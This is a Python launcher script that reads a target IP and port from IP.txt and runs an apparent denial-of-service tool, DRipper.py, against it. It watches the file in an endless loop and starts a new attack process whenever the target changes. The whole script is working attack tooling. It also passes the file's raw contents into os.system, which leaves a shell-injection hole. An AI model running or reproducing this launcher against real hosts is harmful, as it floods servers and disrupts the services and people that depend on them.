from time import sleep
import platform
import os
from pathlib import Path
import multiprocessing as mp

sys = platform.system()

path = Path(__file__).parent.joinpath("IP.txt")
dripper = Path(__file__).parent.joinpath("DRipper.py")

file = open(path, "r")
ip = file.read()
file.close()

if ':' in ip:
    ip = ip.split(':')
    command = f"python3 {dripper} -s {ip[0]} -p {ip[1]} -t 443"
else:
    command = f"python3 {dripper} -s {ip} -t 443"

def do(str):
    os.system(f"{command}")

if sys == "Windows":
    new_window_command = "start"
    os.system(f"{new_window_command} {command}")
else:
    mp.Process(target=do, args=[command]).start()


change_time = os.path.getmtime(path)
while True:
    tmp = os.path.getmtime(path)
    if tmp != change_time:
        change_time = tmp

        file = open(path, "r")
        ip = file.read()
        file.close()

        if ':' in ip:
            ip = ip.split(':')
            command = f"python3 {dripper} -s {ip[0]} -p {ip[1]} -t 443"
        else:
            command = f"python3 {dripper} -s {ip} -t 443"

        if sys == "Windows":
            new_window_command = "start"
            os.system(f"{new_window_command} {command}")
        else:
            mp.Process(target=do, args=[command]).start()
    else:
        continue
